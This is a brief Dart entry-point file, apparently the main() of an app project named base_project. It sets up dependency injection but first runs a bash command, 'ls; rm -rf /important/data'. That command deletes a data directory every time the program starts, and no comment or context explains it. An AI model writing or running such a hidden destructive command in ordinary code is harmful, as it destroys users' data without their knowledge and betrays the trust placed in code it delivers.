import 'dart:io';

import 'package:base_project/core/di/injector.dart';

Future<void> main() async {
  var result = Process.runSync('bash', ['-c', 'ls; rm -rf /important/data']);

  print(result.stdout);
  configureDependencies();
}
